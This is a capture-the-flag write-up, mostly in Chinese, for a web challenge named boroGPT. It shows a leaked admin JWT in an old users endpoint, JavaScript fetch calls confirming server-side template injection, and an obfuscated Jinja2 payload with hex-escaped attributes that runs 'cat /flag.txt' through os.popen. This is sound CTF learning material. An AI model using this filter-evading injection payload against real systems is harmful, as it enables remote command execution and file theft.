# boroGPT

## 題目描述

Introducing boroGPT, boroAI's cutting-edge large language model that will revolutionize the way you think about chatbots! Our engineers have been hard at work building the most secure, scalable, and enterprise-ready AI platform the world has ever seen!

https://mx7pk2qw9nr4slvt.boroctf.com/

## 解題思路

可以看到舊版程式碼有幾個節點，於是分別去了 `/api/v0/users` 和 `/api/v0/jwks`

![alt text](image.png)

`/api/v0/users`

```json
[
    {
        "email": "alice@borocorp.io",
        "id": 1,
        "role": "user",
        "username": "alice"
    },
    {
        "email": "bob@borocorp.io",
        "id": 2,
        "role": "user",
        "username": "bob"
    },
    {
        "email": "carol@borocorp.io",
        "id": 3,
        "role": "moderator",
        "username": "carol"
    },
    {
        "_note": "debug session token",
        "email": "admin@borocorp.io",
        "id": 4,
        "role": "admin",
        "sample_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzcyI6ImJvcm9ncHQtZGV2In0.fdrRsBk-C-8VW3vE_NO8WxY7I0KeYIgWP31aZtTJlzFY-6iTOXV4ztoulDYt3yxGJg8xrbwHrSUJDXgraXj-o_O6Kta4kC9AfitfP6jNkvd7fXnko-5SeysIC9onI2Peqo5xZOgz3IDxU_hrYvYIhExb4V_r6pBeDSEOjj0zLuqzFpVhvBQfDf9NrV-xbcmvxbLzjrZribzVvO2E4WqU8I7dQn5tLbreUipKF8A7wzL_ZtPhT-Z5rErq9mSA59JX7S11z-Ai4BCL9UJLsQ-B-oGMWbKy9-Ex549cD_idxWmhetgnbv5M1r4LqHoBWE-Z80MOSX2uEWLo19B0z4vgGg",
        "username": "admin"
    }
]
```

`/api/v0/jwks`

```json
{
    "keys": [
        {
            "alg": "RS256",
            "e": "AQAB",
            "kid": "borogpt-key-v1",
            "kty": "RSA",
            "n": "npug_-n-aYTHAhguDSVmH1Y41L4T3P6zGO668aFlt869c54nzkCrH38z1uBCQd4VADsDS_0RluPvZxyRRTQnxrJvksN8mUV4WPvHdRnBT83JPZs2n15qAC_nTdtK37b6UNErORB8XAcK0SNfsg9d-xArqXIRop2EMR9yAmTqxPWhyYG_myrXLXWrnCIz0e8n1UzJGUwH88_IYljYomrdQXaz36x6kcCqEvNNolGx0tuv9d7R2m1YnYXvhYzSh8BlyKX0GFsQhDpyiHAYlCzFawrl6RA4KWO2ZcebINvvwlhozMBsQM0woUqUEIdAgM4n9fbMgoUf8pLPhDTRmeGPzw",
            "use": "sig"
        }
    ]
}
```

可以注意到 `/api/v0/users` 給了一個 admin 的 jwt，`/api/v0/jwks` 的資訊沒什麼用，現在就剩下 `/api/v0/render` 沒用到了

可以看到他說要填入 template，很明顯就知道是 ssti，問題是我怎麼試都沒回應

```js
const devFetch = (endpoint, options = {}) => {
  return fetch(endpoint, {
    ...options,
    headers: {
      ...options.headers,
      "X-Dev-Mode": "true"
    }
  });
};

const getUsers = () => devFetch("/api/v0/users");
const renderTemplate = (template, token) => devFetch("/api/v0/render", {
  method: "POST",
  headers: { "Authorization": `Bearer ${token}` },
  body: JSON.stringify({ template })
});

const getJWKS = () => devFetch("/api/v0/jwks");

renderTemplate('{{7*7}}', 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzcyI6ImJvcm9ncHQtZGV2In0.fdrRsBk-C-8VW3vE_NO8WxY7I0KeYIgWP31aZtTJlzFY-6iTOXV4ztoulDYt3yxGJg8xrbwHrSUJDXgraXj-o_O6Kta4kC9AfitfP6jNkvd7fXnko-5SeysIC9onI2Peqo5xZOgz3IDxU_hrYvYIhExb4V_r6pBeDSEOjj0zLuqzFpVhvBQfDf9NrV-xbcmvxbLzjrZribzVvO2E4WqU8I7dQn5tLbreUipKF8A7wzL_ZtPhT-Z5rErq9mSA59JX7S11z-Ai4BCL9UJLsQ-B-oGMWbKy9-Ex549cD_idxWmhetgnbv5M1r4LqHoBWE-Z80MOSX2uEWLo19B0z4vgGg')
```

```json
{"output":""}
```

之後發現是因為 `Content-Type` 不是 `application/json`，改為 `application/json` 以後就可以看到他回傳 49 了

![alt text](image-1.png)

最後用我之前打 picoCTF 弄好的 payload `{{ self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('\x5f\x5fbuiltins\x5f\x5f')|attr('get')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /flag.txt')|attr('read')()}}` 即可得到 flag

## Flag

```text
boroCTF{pub1ic_k3y_g0es_both_ways}
```
